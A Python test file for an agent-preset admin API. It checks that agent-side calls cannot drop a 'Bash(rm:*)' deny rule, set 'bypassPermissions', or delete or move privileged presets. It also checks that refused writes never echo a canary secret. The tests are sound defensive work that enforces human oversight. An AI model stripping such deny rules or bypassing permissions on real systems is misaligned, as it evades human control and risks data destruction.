@pytest.mark.parametrize("patch", [{"wrapper": None}, {"wrapper": {"permissions": None}}])
async def test_patch_null_wrapper_drops_deny_403(call, human, seed, patch):
    pid = await seed({"wrapper": {"permissions": {"deny": ["Bash(rm:*)"]}}})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": patch})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["wrapper.permissions.deny"]
    assert (await human("GET", f"{M}/{pid}")).json() == before


@pytest.mark.parametrize(
    "wrapper", [{"permission_mode": "bypassPermissions"}, {"permission_mode": None}]
)
async def test_patch_permission_mode_auto_to_bypass_403(call, human, seed, wrapper):
    pid = await seed({"wrapper": {"permission_mode": "auto"}})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("PATCH", f"{A}/{pid}", json={"spec": {"wrapper": wrapper}})
    assert_error(r, 403, "human_only_field")
    assert r.json()["error"]["fields"] == ["wrapper.permission_mode"]
    assert (await human("GET", f"{M}/{pid}")).json() == before


async def _all_events(pool):
    async with pool.connection() as conn, conn.cursor(row_factory=dict_row) as cur:
        await cur.execute("SELECT data FROM events ORDER BY id")
        return [row["data"] for row in await cur.fetchall()]


async def test_canary_never_echoed_in_refusals(call, seed, pool, canary, caplog):
    """A value sent in a refused write never comes back in the answer, a log or an event."""
    caplog.set_level(logging.DEBUG)
    pid = await seed({})
    env = {"K": {"value": canary}}
    refused = [
        ("PATCH", 403, "human_only_field", {"spec": {"kube_cluster_access": True, "env": env}}),
        (
            "PATCH",
            422,
            "invalid_request",
            {"spec": {"env": {"K": {**env["K"], "protected": True}}}},
        ),
        ("PATCH", 422, "invalid_request", {"spec": {"env": env}, "replicas": 99}),
        ("PUT", 422, "invalid_request", {"name": "seeded", "spec": {"env": env, "replicas": 99}}),
    ]
    for method, status, code, body in refused:
        r = await call(method, f"{A}/{pid}", json=body)
        assert_error(r, status, code)
        assert canary not in r.text and canary not in str(r.headers)
    assert canary not in caplog.text
    assert canary not in str(await _all_events(pool))


@pytest.mark.parametrize(("flag", "grant"), FLAGS)
async def test_privileged_delete_is_403(call, human, seed, pool, boss, flag, grant):
    """A superleader may not delete a privileged preset: 403 before the delete, the row stays."""
    pid = await seed({**grant, "env": {"K": {"value": "v"}}})
    before = (await human("GET", f"{M}/{pid}")).json()
    r = await call("DELETE", f"{A}/{pid}")
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == [flag]
    assert "proposable" not in r.json()["error"]  # a delete is not a proposal item
    assert (await human("GET", f"{M}/{pid}")).json() == before
    last = (await events(pool, boss.id))[-1]
    assert last["data"]["status"] == 403 and last["data"]["fields"] == [flag]


async def test_privileged_delete_fields_list_every_flag_on(call, human, seed):
    pid = await seed({"kube_cluster_access": True, "session_messaging": True})
    r = await call("DELETE", f"{A}/{pid}")
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["kube_cluster_access", "session_messaging"]
    assert (await human("GET", f"{M}/{pid}")).status_code == 200


async def test_privileged_delete_by_name_is_403(call, human, seed):
    pid = await seed({"docker": True}, name="by-name")
    r = await call("DELETE", f"{A}/by-name")
    assert_error(r, 403, "privileged_target")
    assert (await human("GET", f"{M}/{pid}")).status_code == 200


async def test_non_privileged_delete_unchanged(call, human, seed):
    pid = await seed({"env": {"K": {"value": "v"}}})
    r = await call("DELETE", f"{A}/{pid}")
    assert r.status_code == 204, r.text
    assert (await human("GET", f"{M}/{pid}")).status_code == 404


async def test_privileged_turned_off_then_delete_passes(call, human, seed):
    pid = await seed({"kube_cluster_access": True})
    assert (await call("PUT", f"{A}/{pid}", json={"name": "seeded", "spec": {}})).status_code == 200
    assert (await call("DELETE", f"{A}/{pid}")).status_code == 204


@pytest.mark.parametrize(("flag", "grant"), FLAGS)
async def test_human_delete_of_privileged_unchanged(human, seed, flag, grant):
    pid = await seed(grant)
    assert (await human("DELETE", f"{M}/{pid}")).status_code == 204
    assert (await human("GET", f"{M}/{pid}")).status_code == 404


async def test_delete_grant_flipped_between_check_and_delete_403(
    call, human, seed, pool, monkeypatch
):
    """TOCTOU: a human turns kube_cluster_access on after the route read the preset but before the
    delete. The delete re-reads the row under lock and refuses: 403, nothing deleted."""
    pid = await seed({"env": {"K": {"value": "v"}}})
    real = admin.manageable_preset

    async def flip_after_read(conn, ref):
        found = await real(conn, ref)
        async with pool.connection() as other:
            await other.execute(
                "UPDATE presets SET spec = spec || '{\"kube_cluster_access\": true}'::jsonb"
                " WHERE id = %s",
                (uuid.UUID(pid),),
            )
        return found

    monkeypatch.setattr(admin, "manageable_preset", flip_after_read)
    r = await call("DELETE", f"{A}/{pid}")
    assert_error(r, 403, "privileged_target")
    assert r.json()["error"]["fields"] == ["kube_cluster_access"]
    assert (await human("GET", f"{M}/{pid}")).json()["spec"]["kube_cluster_access"] is True


def test_every_moving_write_is_a_guarded_route():
    guard_routes = {r for r, kind in GUARDED_PRESET_WRITES.items() if kind == "guard"}
    assert set(MOVING_WRITES) == guard_routes - {("POST", A)}


@pytest.mark.parametrize("route", MOVING_WRITES, ids="-".join)
async def test_privileged_preset_move_refused_on_every_admin_preset_write(
    call, human, seed, kube, route
):
    method, path = route
    r = await human("POST", "/api/v1/projects", json={"slug": "elsewhere", "name": "Elsewhere"})
    assert r.status_code == 201, r.text
    pid = await seed({"docker": True})
    before = (await human("GET", f"{M}/{pid}")).json()
    secrets_before = kube.names("Secret")
    body = {"project": "elsewhere"}
    if method == "PUT":
        body |= {"name": "seeded", "spec": {"docker": True}}
    r = await call(method, path.format(ref=pid), json=body)
    assert_error(r, 403, "privileged_preset_move")
    assert r.json()["error"]["fields"] == ["project"]
    assert (await human("GET", f"{M}/{pid}")).json() == before
    assert kube.names("Secret") == secrets_before


@pytest.mark.parametrize("route", MOVING_WRITES, ids="-".join)
async def test_privileged_preset_move_allowed_when_switch_on(call, human, seed, monkeypatch, route):
    monkeypatch.setattr(preset_policy, "AGENT_MAY_MOVE_PRIVILEGED_PRESETS", True)
    method, path = route
    r = await human("POST", "/api/v1/projects", json={"slug": "elsewhere", "name": "Elsewhere"})
    assert r.status_code == 201, r.text
    pid = await seed({"docker": True})
    body = {"project": "elsewhere"}
    if method == "PUT":
        body |= {"name": "seeded", "spec": {"docker": True}}
    r = await call(method, path.format(ref=pid), json=body)
    assert r.status_code == 200, r.text
    assert r.json()["project"] == "elsewhere"
    assert (await human("GET", f"{M}/{pid}")).json()["project"] == "elsewhere"
